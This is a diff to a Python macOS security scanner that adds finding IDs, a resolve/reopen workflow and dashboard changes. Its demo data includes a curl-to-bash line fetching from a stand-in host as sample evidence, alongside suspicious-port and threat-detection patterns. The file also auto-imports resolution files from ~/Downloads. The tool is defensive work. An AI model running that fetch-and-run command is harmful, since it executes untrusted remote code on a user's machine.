@@ -7,12 +7,14 @@ No sudo, no third-party packages, no network calls. Works with the python3 that
 ships with Apple's Command Line Tools (3.9+).
 
 Commands
-  python3 mac_sentinel_synthesis_scanner.py sample            Take one network snapshot (run every 15 min)
-  python3 mac_sentinel_synthesis_scanner.py report [--open]   Collect everything and write the HTML dashboard
-  python3 mac_sentinel_synthesis_scanner.py install           Install two user LaunchAgents (sampler + 7am report)
-  python3 mac_sentinel_synthesis_scanner.py uninstall          Remove those LaunchAgents
-  python3 mac_sentinel_synthesis_scanner.py rebaseline         Accept current persistence items as the new "known good"
-  python3 mac_sentinel_synthesis_scanner.py demo [--out F]     Write a dashboard filled with sample data
+  python3 mac_sentinel_synthesis_scanner.py sample              Take one network snapshot (run every 15 min)
+  python3 mac_sentinel_synthesis_scanner.py report [--open]     Collect everything and write the HTML dashboard
+  python3 mac_sentinel_synthesis_scanner.py install             Install two user LaunchAgents (sampler + 7am report)
+  python3 mac_sentinel_synthesis_scanner.py uninstall            Remove those LaunchAgents
+  python3 mac_sentinel_synthesis_scanner.py rebaseline           Accept current persistence items as the new "known good"
+  python3 mac_sentinel_synthesis_scanner.py resolve [ID|--all]   Mark finding(s) as resolved in state/findings_state.json
+  python3 mac_sentinel_synthesis_scanner.py unresolve [ID|--all] Reopen resolved finding(s)
+  python3 mac_sentinel_synthesis_scanner.py demo [--out F]       Write a dashboard filled with sample data
 
 Data lives in ~/MacSentinelSynthesisScanner (reports/, state/). Nothing ever leaves the Mac.
 """
@@ -32,15 +34,16 @@ import socket
 import subprocess
 import sys
 
-VERSION = "1.0.0"
-HOME = os.path.expanduser("~")
-BASE_DIR = os.path.join(HOME, "MacSentinelSynthesisScanner")
+VERSION = "1.1.0"
+HOME = os.path.expanduser("~" + os.environ["SUDO_USER"]) if os.environ.get("SUDO_USER") else os.path.expanduser("~")
+BASE_DIR = os.path.expanduser(os.environ.get("MAC_SENTINEL_SYNTHESIS_SCANNER_DIR") or os.path.join(HOME, "MacSentinelSynthesisScanner"))
 STATE_DIR = os.path.join(BASE_DIR, "state")
 REPORT_DIR = os.path.join(BASE_DIR, "reports")
 SAMPLES_FILE = os.path.join(STATE_DIR, "net_samples.jsonl")
 BASELINE_FILE = os.path.join(STATE_DIR, "baseline.json")
 HISTORY_FILE = os.path.join(STATE_DIR, "history.json")
 KNOWN_PROCS_FILE = os.path.join(STATE_DIR, "known_net_processes.json")
+FINDINGS_STATE_FILE = os.path.join(STATE_DIR, "findings_state.json")
 WINDOW_HOURS = 24
 
 # Remote ports that are routine for a desktop Mac. Anything else gets flagged.
@@ -52,13 +55,6 @@ COMMON_PORTS = {
 SUSPICIOUS_PORTS = {
     1337, 3333, 4444, 4445, 5555, 6666, 6667, 6697, 7777, 8888, 9001, 9030, 9050,
     9051, 14444, 31337, 45700,
-}
-# Processes that routinely listen on all interfaces for completely ordinary reasons
-# (Apple Continuity/AirPlay, cloud-sync LAN discovery). Still surfaced, just as "info"
-# instead of "medium", so a flood of normal listeners doesn't look like a security risk.
-BENIGN_LISTENERS = {
-    "rapportd", "controlcenter", "sharingd", "dropboxfileprovider",
-    "dropbox", "googledrivefs", "onedrive", "coreaudiod", "mdnsresponder",
 }
 LARGE_UPLOAD_BYTES = 500 * 1024 * 1024  # 500 MB per day from a single process
 SUSPICIOUS_PATH_PREFIXES = ("/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/folders/",
@@ -138,9 +134,106 @@ def mtime_iso(path):
         return None
 
 
+def finding_id(module, title, evidence=""):
+    raw = "%s|%s|%s" % (module, title, str(evidence)[:400])
+    return hashlib.sha1(raw.encode("utf-8", errors="replace")).hexdigest()[:10]
+
+
 def finding(findings, severity, module, title, detail="", evidence=""):
-    findings.append({"severity": severity, "module": module, "title": title,
-                     "detail": detail, "evidence": str(evidence)[:400]})
+    ev = str(evidence)[:400]
+    findings.append({"id": finding_id(module, title, ev), "severity": severity, "module": module,
+                     "title": title, "detail": detail, "evidence": ev})
+
+
+def import_downloaded_resolutions(state):
+    """Automatically ingest any mac-sentinel-synthesis-scanner-resolutions*.json saved from the browser into ~/Downloads."""
+    dl_dir = os.path.join(HOME, "Downloads")
+    if not os.path.isdir(dl_dir):
+        return False
+    changed = False
+    for path in sorted(glob.glob(os.path.join(dl_dir, "mac-sentinel-synthesis-scanner-resolutions*.json"))):
+        try:
+            with open(path, errors="replace") as fh:
+                data = json.load(fh)
+            if data.get("format") != "mac-sentinel-synthesis-scanner-resolutions":
+                continue
+            ts_file = data.get("created") or iso(now())
+            for fid in data.get("resolve", []):
+                if fid in state:
+                    state[fid]["resolved"] = True
+                    state[fid]["resolved_at"] = ts_file
+                    changed = True
+                else:
+                    state[fid] = {"id": fid, "resolved": True, "resolved_at": ts_file, "first_seen": ts_file, "days": []}
+                    changed = True
+            for fid in data.get("reopen", []):
+                if fid in state:
+                    state[fid]["resolved"] = False
+                    state[fid]["resolved_at"] = None
+                    changed = True
+            os.remove(path)
+        except Exception:
+            continue
+    return changed
+
+
+def reconcile_findings(findings):
+    """Attach first_seen / last_seen / days_seen / is_new / resolved from state/findings_state.json."""
+    state = load_json(FINDINGS_STATE_FILE, {})
+    import_downloaded_resolutions(state)
+    today = now().strftime("%Y-%m-%d")
+    ts_now = iso(now())
+    seen_ids = set()
+    uniq = []
+    for f in findings:
+        fid = f.get("id") or finding_id(f["module"], f["title"], f.get("evidence", ""))
+        f["id"] = fid
+        if fid in seen_ids:
+            continue
+        seen_ids.add(fid)
+        rec = state.get(fid, {})
+        first_seen = rec.get("first_seen") or ts_now
+        days_list = rec.get("days") or []
+        if today not in days_list:
+            days_list = (days_list + [today])[-90:]
+        resolved = bool(rec.get("resolved", False))
+        resolved_at = rec.get("resolved_at")
+        f["first_seen"] = first_seen
+        f["last_seen"] = ts_now
+        f["days_seen"] = len(days_list)
+        f["is_new"] = first_seen[:10] == today and len(days_list) == 1
+        f["resolved"] = resolved
+        f["resolved_at"] = resolved_at
+        state[fid] = {
+            "id": fid, "module": f["module"], "severity": f["severity"], "title": f["title"],
+            "evidence": f.get("evidence", ""), "first_seen": first_seen, "last_seen": ts_now,
+            "days": days_list, "resolved": resolved, "resolved_at": resolved_at,
+        }
+        uniq.append(f)
+    save_json(FINDINGS_STATE_FILE, state)
+    return uniq
+
+
+def cli_resolve(targets, resolve_flag=True):
+    state = load_json(FINDINGS_STATE_FILE, {})
+    ts_now = iso(now())
+    count = 0
+    if "--all" in targets or "all" in targets:
+        for fid, rec in state.items():
+            rec["resolved"] = resolve_flag
+            rec["resolved_at"] = ts_now if resolve_flag else None
+            count += 1
+    else:
+        for t in targets:
+            t = t.strip()
+            for fid, rec in state.items():
+                if fid == t or fid.startswith(t):
+                    rec["resolved"] = resolve_flag
+                    rec["resolved_at"] = ts_now if resolve_flag else None
+                    count += 1
+    save_json(FINDINGS_STATE_FILE, state)
+    action = "Resolved" if resolve_flag else "Reopened"
+    print("%s %d finding(s) in %s" % (action, count, shorten_home(FINDINGS_STATE_FILE)))
 
 
 def shorten_home(p):
@@ -363,12 +456,8 @@ def collect_network(findings, status):
         seen_l.add(k)
         uniq_listen.append(l)
         if not l["local_only"]:
-            if (l["process"] or "").lower() in BENIGN_LISTENERS:
-                finding(findings, "info", "network", "%s accepts connections from the network" % l["process"],
-                        "Normal for this process (Continuity/AirPlay or cloud-sync LAN discovery). No action needed.", l["address"])
-            else:
-                finding(findings, "medium", "network", "%s accepts connections from the network" % l["process"],
-                        "Listening on all interfaces. Fine for AirPlay or dev servers you started; otherwise investigate.", l["address"])
+            finding(findings, "medium", "network", "%s accepts connections from the network" % l["process"],
+                    "Listening on all interfaces. Fine for AirPlay or dev servers you started; otherwise investigate.", l["address"])
 
     conns = sorted(agg.values(), key=lambda a: (-len(a["flags"]), -a["count"]))[:400]
     status["network"] = {"state": "ok" if samples else "partial",
@@ -410,13 +499,11 @@ def collect_littlesnitch(findings, status):
     rc, ps_out, _ = run(["ps", "-axo", "comm="])
     ps_lines = [l.lower() for l in ps_out.splitlines()]
     running = any("little snitch" in l for l in ps_lines)
-    ls_installed = cli is not None or os.path.exists("/Applications/Little Snitch.app")
     version = app_version("/Applications/Little Snitch.app")
 
-    lulu_installed = os.path.exists("/Applications/LuLu.app")
-    lulu_ver = app_version("/Applications/LuLu.app") if lulu_installed else None
+    lulu_ver = app_version("/Applications/LuLu.app")
     lulu_running = any("lulu" in l for l in ps_lines)
-    lulu = {"installed": lulu_installed, "version": lulu_ver, "running": lulu_running}
+    lulu = {"installed": bool(lulu_ver), "version": lulu_ver, "running": lulu_running}
 
     events, note = [], ""
     if cli:
@@ -427,26 +514,16 @@ def collect_littlesnitch(findings, status):
     elif not lulu["installed"]:
         note = "Neither Little Snitch CLI nor LuLu detected."
 
-    # Check readable LuLu log files if present. We only know when the file was last
-    # written, not the real time of each line, so skip files outside the report
-    # window entirely and leave individual event times unknown rather than stamping
-    # every line with the file's mtime (which would make them all look simultaneous).
-    log_cutoff = now() - dt.timedelta(hours=WINDOW_HOURS)
+    # Check readable LuLu log files if present
     for lp in glob.glob(os.path.join(HOME, "Library/Logs/*LuLu*")) + glob.glob("/Library/Logs/*LuLu*"):
-        if not os.access(lp, os.R_OK):
-            continue
-        try:
-            if dt.datetime.fromtimestamp(os.path.getmtime(lp)).astimezone() < log_cutoff:
-                continue
-        except OSError:
-            continue
-        try:
-            with open(lp, errors="replace") as fh:
-                for ln in fh.readlines()[-200:]:
-                    if ln.strip():
-                        events.append({"time": None, "process": "LuLu", "message": ln.strip()[:400]})
-        except OSError:
-            pass
+        if os.access(lp, os.R_OK):
+            try:
+                with open(lp, errors="replace") as fh:
+                    for ln in fh.readlines()[-200:]:
+                        if ln.strip():
+                            events.append({"time": mtime_iso(lp), "process": "LuLu", "message": ln.strip()[:400]})
+            except OSError:
+                pass
 
     denied = 0
     for e in events:
@@ -455,11 +532,11 @@ def collect_littlesnitch(findings, status):
         denied += e["denied"]
     events.sort(key=lambda e: e["time"] or "", reverse=True)
 
-    if not ls_installed and not lulu["installed"]:
+    if version is None and not cli and not lulu["installed"]:
         status["littlesnitch"] = {"state": "unavailable", "reason": "No third-party outbound firewall installed (Little Snitch / LuLu)"}
         finding(findings, "info", "littlesnitch", "No third-party outbound firewall detected", "Network panel still monitors sockets via lsof/nettop.")
     else:
-        if ls_installed and not running:
+        if version and not running:
             finding(findings, "high", "littlesnitch", "Little Snitch is installed but not running",
                     "Outbound connections are not being filtered by Little Snitch right now.", "No Little Snitch process found")
         if lulu["installed"] and not lulu["running"]:
@@ -706,7 +783,30 @@ MB_PROC_RE = re.compile(
     r"malwarebytes|RTProtectionDaemon|FrontendAgent|com\.malwarebytes|mbam|"
     r"BlockBlock|OverSight|KnockKnock|RansomWhere|clamd|freshclam", re.I
 )
-MB_LINE_RE = re.compile(r"threat|detect|quarantin|malware(?!bytes)|pup|scan (complete|finished)|removed|alert|blocked", re.I)
+MB_NOISE_RE = re.compile(
+    r"malwarebytes://|FrontendAppKit|RouteEvent|agentMenu|buttonOpen|"
+    r"\b0\s+(threats?|detections?|infected|quarantined|items?)\b|"
+    r"\b(threats?|detections?|infected|quarantined)\s*[:=]\s*0\b|"
+    r"\bno\s+(threats?|malware|infections?)\s+(found|detected)\b", re.I
+)
+MB_LINE_RE = re.compile(
+    r"\b(threats?\s+(detected|found|quarantined|removed|blocked)|"
+    r"malware\s+(detected|found|quarantined|removed|blocked)|"
+    r"quarantined\s+(file|item|threat|malware|process)|"
+    r"potentially\s+unwanted|pup\.[a-z0-9]|trojan\.|adware\.|"
+    r"infected\s+files?\s*[:=]\s*[1-9]|"
+    r"scan\s+(complete|finished)|"
+    r"ransomwhere|blockblock\s+(alert|blocked))\b", re.I
+)
+MB_THREAT_RE = re.compile(
+    r"\b(threats?\s+(detected|found|quarantined|blocked)|"
+    r"found\s+[1-9]\d*\s+threats?|"
+    r"(threats?|detections?|infected\s+files?)\s*[:=]\s*[1-9]\d*|"
+    r"malware\s+(detected|found|quarantined|blocked)|"
+    r"quarantined\s+(file|item|threat|malware|process)|"
+    r"pup\.[a-z0-9]|trojan\.|adware\.|"
+    r"ransomwhere\s+(alert|blocked)|blockblock\s+(alert|blocked))\b", re.I
+)
 
 ENDPOINT_CATALOG = [
     ("Malwarebytes", "/Applications/Malwarebytes.app", r"malwarebytes|RTProtectionDaemon|FrontendAgent|mbam", True),
@@ -784,7 +884,7 @@ def collect_malwarebytes(findings, status):
                     continue
                 logs.append({"path": shorten_home(p), "modified": mtime_iso(p)})
                 for l in tail:
-                    if MB_LINE_RE.search(l):
+                    if not MB_NOISE_RE.search(l) and MB_LINE_RE.search(l):
                         lines.append(l.rstrip()[:300])
     lines = lines[-150:]
 
@@ -794,8 +894,7 @@ def collect_malwarebytes(findings, status):
         finding(findings, "info", "malwarebytes", "No third-party endpoint scanner detected",
                 "Optional: supports Malwarebytes, Objective-See (BlockBlock, OverSight, KnockKnock), and ClamAV.")
     else:
-        threat_lines = [l for l in lines if re.search(r"threat|detect|quarantin|malware(?!bytes)|pup", l, re.I)
-                        and not re.search(r"\b0 (threats|detections)\b", l, re.I)]
+        threat_lines = [l for l in lines if MB_THREAT_RE.search(l) and not MB_NOISE_RE.search(l)]
         if threat_lines:
             finding(findings, "medium", "malwarebytes", "Endpoint logs mention threats or quarantine",
                     "Review your scanner's detection history for details.", threat_lines[-1])
@@ -1018,7 +1117,8 @@ def build_report(rebaseline=False):
     report = {"meta": {
         "generated_at": iso(now()), "hostname": socket.gethostname().replace(".local", ""),
         "user": os.environ.get("USER", ""), "macos_version": platform.mac_ver()[0] or platform.platform(),
-        "window_hours": WINDOW_HOURS, "collector_version": VERSION, "demo": False}}
+        "window_hours": WINDOW_HOURS, "collector_version": VERSION, "demo": False,
+        "script_path": shorten_home(os.path.abspath(__file__))}}
     for key, fn in [("network", collect_network), ("littlesnitch", collect_littlesnitch),
                     ("gatekeeper", collect_gatekeeper), ("malwarebytes", collect_malwarebytes)]:
         try:
@@ -1031,9 +1131,10 @@ def build_report(rebaseline=False):
     except Exception as exc:
         report["persistence"] = {}
         status["persistence"] = {"state": "unavailable", "reason": "Collector error: %s" % exc}
+    findings = reconcile_findings(findings)
     report["findings"] = findings
     report["module_status"] = status
-    report["history"] = update_history(findings)
+    report["history"] = update_history([f for f in findings if not f.get("resolved")])
     return report
 
 
@@ -1130,22 +1231,36 @@ def demo_report():
     findings = [
         {"severity": "high", "module": "persistence", "title": "User launch item new: com.update.helper",
          "detail": "Runs an inline shell command; Downloads content at launch. Runs automatically at login or boot. Confirm you installed it.",
-         "evidence": "/bin/bash -c curl -s https://cdn-upd8.example/agent | bash"},
+         "evidence": "/bin/bash -c curl -s https://cdn-upd8.example/agent | bash",
+         "first_seen": ts(2, 15), "last_seen": ts(0, 0), "days_seen": 1, "is_new": True, "resolved": False},
         {"severity": "high", "module": "gatekeeper", "title": "Quarantine flag removed from a downloaded app",
          "detail": "It came from the internet but Gatekeeper's quarantine mark is gone. Malware installers often do this.",
-         "evidence": "~/Downloads/VideoPlayerPro.app ← https://free-codecs.example/dl"},
+         "evidence": "~/Downloads/VideoPlayerPro.app ← https://free-codecs.example/dl",
+         "first_seen": ts(3, 10), "last_seen": ts(0, 0), "days_seen": 1, "is_new": True, "resolved": False},
         {"severity": "medium", "module": "persistence", "title": "New Chrome extension: PDF Converter Plus",
-         "detail": "Extensions can read pages you visit, including passwords and webmail. Confirm you added it.", "evidence": "kbfnbcaeplbcioakkpcpgfkobkghlhen"},
+         "detail": "Extensions can read pages you visit, including passwords and webmail. Confirm you added it.",
+         "evidence": "kbfnbcaeplbcioakkpcpgfkobkghlhen",
+         "first_seen": ts(5, 30), "last_seen": ts(0, 0), "days_seen": 1, "is_new": True, "resolved": False},
         {"severity": "medium", "module": "network", "title": "Python accepts connections from the network",
-         "detail": "Listening on all interfaces. Fine for AirPlay or dev servers you started; otherwise investigate.", "evidence": "*:8501"},
+         "detail": "Listening on all interfaces. Fine for AirPlay or dev servers you started; otherwise investigate.",
+         "evidence": "*:8501",
+         "first_seen": ts(96, 0), "last_seen": ts(0, 0), "days_seen": 5, "is_new": False, "resolved": False},
         {"severity": "medium", "module": "gatekeeper", "title": "Unsigned app in ~/Downloads",
-         "detail": "No developer signature. Only run it if you trust where it came from.", "evidence": "~/Downloads/VideoPlayerPro.app"},
+         "detail": "No developer signature. Only run it if you trust where it came from.",
+         "evidence": "~/Downloads/VideoPlayerPro.app",
+         "first_seen": ts(3, 10), "last_seen": ts(0, 0), "days_seen": 1, "is_new": True, "resolved": False},
         {"severity": "low", "module": "network", "title": "Steam used uncommon port 27036",
-         "detail": "Often legitimate (games, VPNs, dev tools). Confirm you recognise it.", "evidence": "162.254.193.6:27036"},
+         "detail": "Often legitimate (games, VPNs, dev tools). Confirm you recognise it.",
+         "evidence": "162.254.193.6:27036",
+         "first_seen": ts(144, 0), "last_seen": ts(0, 0), "days_seen": 7, "is_new": False, "resolved": False},
         {"severity": "low", "module": "littlesnitch", "title": "Host firewall blocked 14 connection events",
-         "detail": "Blocks are normal. A sudden spike can mean a background process keeps retrying.", "evidence": "14 deny events"},
+         "detail": "Blocks are normal. A sudden spike can mean a background process keeps retrying.",
+         "evidence": "14 deny events",
+         "first_seen": ts(48, 0), "last_seen": ts(0, 0), "days_seen": 3, "is_new": False, "resolved": False},
         {"severity": "low", "module": "network", "title": "VideoPlayerPro went online for the first time",
-         "detail": "New since Mac Sentinel Synthesis Scanner started watching. Expected after installing apps.", "evidence": "VideoPlayerPro"},
+         "detail": "New since Mac Sentinel Synthesis Scanner started watching. Expected after installing apps.",
+         "evidence": "VideoPlayerPro",
+         "first_seen": ts(2, 45), "last_seen": ts(0, 0), "days_seen": 1, "is_new": True, "resolved": False},
     ]
     conns = [
         ("Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "142.250.72.14", 443, "TCP", 96, []),
@@ -1166,7 +1281,10 @@ def demo_report():
     # The VideoPlayerPro row has an odd path — make that a high finding too
     findings.insert(2, {"severity": "high", "module": "network", "title": "Network activity from a temporary or download folder",
                         "detail": "VideoPlayerPro is running from ~/Downloads/VideoPlayerPro.app. Malware often runs from these locations.",
-                        "evidence": "185.220.101.34:443"})
+                        "evidence": "185.220.101.34:443",
+                        "first_seen": ts(2, 45), "last_seen": ts(0, 0), "days_seen": 1, "is_new": True, "resolved": False})
+    for f in findings:
+        f["id"] = finding_id(f["module"], f["title"], f.get("evidence", ""))
     talkers = [("Dropbox", 1.4e9, 3.1e8), ("Google Chrome", 2.2e9, 1.9e8), ("Slack", 3.4e8, 4.2e7), ("Spotify", 6.1e8, 9.0e6),
                ("zoom.us", 4.4e8, 3.9e8), ("Mail", 1.2e8, 2.4e7), ("VideoPlayerPro", 2.1e6, 4.8e7), ("Steam", 9.5e7, 3.0e6)]
     events = [
@@ -1275,6 +1393,12 @@ def main():
     i.add_argument("--interval", type=int, default=15, help="minutes between network samples")
     sub.add_parser("uninstall")
     sub.add_parser("rebaseline")
+    rs = sub.add_parser("resolve", help="mark finding ID(s) or --all as resolved")
+    rs.add_argument("targets", nargs="*", help="finding ID(s) to resolve")
+    rs.add_argument("--all", action="store_true", help="mark all known findings as resolved")
+    un = sub.add_parser("unresolve", help="reopen resolved finding ID(s) or --all")
+    un.add_argument("targets", nargs="*", help="finding ID(s) to reopen")
+    un.add_argument("--all", action="store_true", help="reopen all resolved findings")
     d = sub.add_parser("demo")
     d.add_argument("--out", default=os.path.join(BASE_DIR, "demo.html"))
     d.add_argument("--open", action="store_true")
@@ -1285,6 +1409,12 @@ def main():
         print("Demo dashboard: %s" % path)
         if args.open:
             run(["open", path])
+        return
+    if args.cmd in ("resolve", "unresolve"):
+        targs = (["--all"] if getattr(args, "all", False) else []) + (args.targets or [])
+        if not targs:
+            sys.exit("Specify one or more finding IDs or --all (e.g. `python3 mac_sentinel_synthesis_scanner.py resolve --all`).")
+        cli_resolve(targs, resolve_flag=(args.cmd == "resolve"))
         return
     if sys.platform != "darwin":
         sys.exit("Mac Sentinel Synthesis Scanner only runs on macOS (use `demo` to preview the dashboard elsewhere).")
@@ -1469,10 +1599,29 @@ p { text-wrap: pretty; max-width: 72ch; }
 .module-reason { font-size: var(--text-xs); color: var(--color-text-muted); line-height: 1.45; margin-top: 2px; }
 
 /* Filters */
+.filters { display: flex; justify-content: space-between; gap: var(--space-3); flex-wrap: wrap; margin-bottom: var(--space-4); }
 .chips { display: flex; gap: var(--space-2); flex-wrap: wrap; }
 .chip { font-size: var(--text-xs); padding: var(--space-1) var(--space-3); border-radius: var(--radius-full); border: 1px solid var(--color-border); color: var(--color-text-muted); }
 .chip:hover { color: var(--color-text); border-color: var(--color-text-faint); }
 .chip[aria-pressed="true"] { background: var(--color-primary-highlight); border-color: var(--color-primary); color: var(--color-text); }
+
+/* Action buttons & sync banner */
+td.act { width: 1%; white-space: nowrap; text-align: right; }
+.act-btn {
+  display: inline-flex; align-items: center; gap: var(--space-1); font-size: var(--text-xs); font-weight: 500;
+  padding: 0.2rem var(--space-3); border-radius: var(--radius-md); border: 1px solid var(--color-border);
+  background: var(--color-surface-2); color: var(--color-text-muted); white-space: nowrap;
+}
+.act-btn:hover { color: var(--color-text); border-color: var(--color-text-faint); background: var(--color-surface-offset); }
+.act-btn.primary:hover { border-color: var(--color-primary); color: var(--color-primary); }
+.sync-bar {
+  display: grid; grid-template-columns: 1fr auto; gap: var(--space-2) var(--space-4); align-items: center;
+  padding: var(--space-3) var(--space-5); margin-bottom: var(--space-6); border-radius: var(--radius-lg);
+  background: var(--color-primary-highlight); border: 1px solid color-mix(in oklab, var(--color-primary) 45%, transparent);
+  font-size: var(--text-sm);
+}
+.sync-actions { display: flex; gap: var(--space-2); flex-wrap: wrap; }
+.sync-help { grid-column: 1 / -1; font-size: var(--text-xs); color: var(--color-text-muted); }
 
 /* Tables */
 .table-wrap { overflow-x: auto; overscroll-behavior: contain; margin-inline: calc(-1 * var(--space-5)); padding-inline: var(--space-5); }
@@ -1666,8 +1815,54 @@ td.r, th.r { text-align: right; }
     tableEl.querySelectorAll(".sort-ind").forEach(function (s, i) { s.textContent = i === ci ? (t.dir === 1 ? "▲" : "▼") : ""; });
   });
 
-  // ---------- data prep ----------
-  var findings = (R.findings || []).slice().sort(function (a, b) { return SEV_ORDER[a.severity] - SEV_ORDER[b.severity]; });
+  // ---------- resolution state ----------
+  // Resolutions clicked in the browser persist in this browser's localStorage,
+  // so they survive a reload or closing the tab. Clicking "Save to Mac Sentinel
+  // Synthesis Scanner" downloads a small JSON file to ~/Downloads that the next
+  // `python3 mac_sentinel_synthesis_scanner.py report` run imports automatically
+  // into ~/MacSentinelSynthesisScanner/state/findings_state.json (and deletes the
+  // temp file) — that's the only way a resolution reaches another browser or
+  // another report run.
+  var LOCAL_KEY = "mac-sentinel-synthesis-scanner-local-resolve-state";
+  var LOCAL = (function () {
+    try { return JSON.parse(localStorage.getItem(LOCAL_KEY)) || {}; } catch (e) { return {}; }
+  })();
+  function persistLocal() {
+    try { localStorage.setItem(LOCAL_KEY, JSON.stringify(LOCAL)); } catch (e) { /* private window, quota, etc. — fail silently */ }
+  }
+  var ALL = (R.findings || []).slice();
+  var BY_ID = {}; ALL.forEach(function (f) { BY_ID[f.id] = f; });
+  // Entries already matching this report's own baked-in state are no longer
+  // "pending" — drop them so localStorage doesn't grow forever across reports.
+  Object.keys(LOCAL).forEach(function (id) {
+    var f = BY_ID[id];
+    if (f && !!LOCAL[id].resolved === !!f.resolved) delete LOCAL[id];
+  });
+  persistLocal();
+  function isResolved(f) { var l = LOCAL[f.id]; return l ? !!l.resolved : !!f.resolved; }
+  function resolvedAt(f) { var l = LOCAL[f.id]; return (l && l.resolved) ? l.at : f.resolved_at; }
+  function pendingChanges() {
+    return Object.keys(LOCAL).filter(function (id) { var f = BY_ID[id]; return f && !!LOCAL[id].resolved !== !!f.resolved; });
+  }
+  function sortFindings(list) {
+    return list.slice().sort(function (a, b) {
+      return (SEV_ORDER[a.severity] - SEV_ORDER[b.severity]) || ((b.is_new ? 1 : 0) - (a.is_new ? 1 : 0)) ||
+        String(b.first_seen || "").localeCompare(String(a.first_seen || ""));
+    });
+  }
+  var findings, resolvedList;
+  function recompute() {
+    findings = sortFindings(ALL.filter(function (f) { return !isResolved(f); }));
+    resolvedList = sortFindings(ALL.filter(isResolved));
+  }
+  recompute();
+  var VIEW = "open", SEVF = "all";
+  function fmtDay(iso) {
+    if (!iso) return "—";
+    var d = new Date(iso);
+    if (isNaN(d)) return esc(iso);
+    return d.toLocaleDateString([], { month: "short", day: "numeric" });
+  }
   function countSev(list, s) { return list.filter(function (f) { return f.severity === s; }).length; }
   function moduleFindings(m) { return findings.filter(function (f) { return f.module === m; }); }
   var MODULES = [
@@ -1680,7 +1875,16 @@ td.r, th.r { text-align: right; }
   ];
   var MOD_NAME = {}; MODULES.forEach(function (m) { MOD_NAME[m.id] = m.label; });
 
-  function findingsTable(list, showModule) {
+  function seenCell(r) {
+    if (isResolved(r)) {
+      var at = resolvedAt(r);
+      return tag("Resolved", "ok") + '<div class="detail">' + (at ? "on " + fmtDay(at) : "") + " · first seen " + fmtDay(r.first_seen) + "</div>";
+    }
+    if (r.is_new) return tag("New today", "new") + '<div class="detail">First seen ' + fmtClock(r.first_seen) + "</div>";
+    var d = r.days_seen || 1;
+    return tag("Ongoing", "") + '<div class="detail">Since ' + fmtDay(r.first_seen) + " · " + d + (d === 1 ? " day" : " days") + "</div>";
+  }
+  function findingsTable(list, showModule, resolvedView) {
     var cols = [
       { label: "Severity", key: "severity", render: function (r) { return sev(r.severity); }, sort: function (r) { return SEV_ORDER[r.severity]; } },
       { label: "Finding", key: "title", cls: "wrap", render: function (r) {
@@ -1688,8 +1892,22 @@ td.r, th.r { text-align: right; }
       } }
     ];
     if (showModule) cols.push({ label: "Source", key: "module", render: function (r) { return tag(MOD_NAME[r.module] || r.module); } });
+    cols.push({ label: resolvedView ? "Status" : "First seen", key: "first_seen", render: seenCell,
+      sort: function (r) { return r.is_new ? "9999" : String(r.first_seen || ""); } });
     cols.push({ label: "Evidence", key: "evidence", cls: "clip", render: function (r) { return '<span class="mono" title="' + esc(r.evidence) + '">' + esc(r.evidence || "—") + "</span>"; } });
-    return table(cols, list, "No findings", " Nothing in this area needs attention today.");
+    cols.push({ label: "", key: "id", cls: "act", render: function (r) {
+      return isResolved(r)
+        ? '<button class="act-btn" data-reopen="' + esc(r.id) + '" aria-label="Reopen: ' + esc(r.title) + '">Reopen</button>'
+        : '<button class="act-btn primary" data-resolve="' + esc(r.id) + '" aria-label="Mark resolved: ' + esc(r.title) + '">Resolve</button>';
+    } });
+    return table(cols, list, resolvedView ? "Nothing resolved yet" : "No open findings",
+      resolvedView ? " Findings you mark as resolved appear here and stay hidden from future reports." : " Nothing in this area needs attention.");
+  }
+  function overviewList() {
+    var base = VIEW === "resolved" ? resolvedList : findings.filter(function (f) {
+      return VIEW === "new" ? f.is_new : VIEW === "ongoing" ? !f.is_new : true;
+    });
+    return SEVF === "all" ? base : base.filter(function (f) { return f.severity === SEVF; });
   }
 
   // ---------- panels ----------
@@ -1706,9 +1924,13 @@ td.r, th.r { text-align: right; }
     var unsigned = (gk.downloads || []).filter(function (d) { return d.verdict === "unsigned" || d.verdict === "stripped"; }).length;
     var changes = (ps.changes_count || 0);
 
+    var newCount = findings.filter(function (f) { return f.is_new; }).length;
+    var ongoing = findings.length - newCount;
+    if (newCount) msg = newCount + " new today, " + ongoing + " carried over from earlier days. " + msg;
     var html = '<div class="verdict ' + verdict + '">' + ico + "<div><h2>" + esc(title) + "</h2><p>" + esc(msg) + "</p></div></div>";
     html += '<div class="kpis">' +
       kpi("High findings", h, "Medium " + m + " · Low " + l, h ? "alert" : "") +
+      kpi("New today", newCount, ongoing + " ongoing · " + resolvedList.length + " resolved", newCount ? "warn" : "") +
       kpi("Remote endpoints", (net.unique_remotes || 0), (net.samples || 0) + " network samples", "") +
       kpi("Downloads checked", (gk.downloads || []).length, unsigned + " unsigned or stripped", unsigned ? "warn" : "") +
       kpi("Persistence changes", changes, ps.baseline_created ? "Baseline created today" : "vs. saved baseline", changes ? "warn" : "") +
@@ -1741,11 +1963,18 @@ td.r, th.r { text-align: right; }
 
     html += '<div class="grid-2">' + card("Module health", "Select a module to open it", modsHtml) + card("Findings trend", hist.length + " days", trend) + "</div>";
 
-    var chips = '<div class="chips" id="sev-chips">' + ["all", "high", "medium", "low", "info"].map(function (s) {
-      var n = s === "all" ? findings.length : countSev(findings, s);
-      return '<button class="chip" aria-pressed="' + (s === "all") + '" data-sev="' + s + '">' + (s === "all" ? "All" : SEV_LABEL[s]) + " <span class=\"num\">" + n + "</span></button>";
+    var views = [["open", "All open", findings.length], ["new", "New today", newCount], ["ongoing", "Ongoing", ongoing], ["resolved", "Resolved", resolvedList.length]];
+    var viewChips = '<div class="chips" role="group" aria-label="Finding status">' + views.map(function (v) {
+      return '<button class="chip" aria-pressed="' + (VIEW === v[0]) + '" data-view="' + v[0] + '">' + v[1] + ' <span class="num">' + v[2] + "</span></button>";
     }).join("") + "</div>";
-    html += '<section class="card"><div class="card-head"><h3 class="card-title">All findings</h3>' + chips + '</div><div id="findings-body">' + findingsTable(findings, true) + "</div></section>";
+    var sevSrc = VIEW === "resolved" ? resolvedList : findings;
+    var sevChips = '<div class="chips" role="group" aria-label="Severity">' + ["all", "high", "medium", "low", "info"].map(function (s) {
+      var n = s === "all" ? sevSrc.length : countSev(sevSrc, s);
+      return '<button class="chip" aria-pressed="' + (SEVF === s) + '" data-sev="' + s + '">' + (s === "all" ? "Any severity" : SEV_LABEL[s]) + ' <span class="num">' + n + "</span></button>";
+    }).join("") + "</div>";
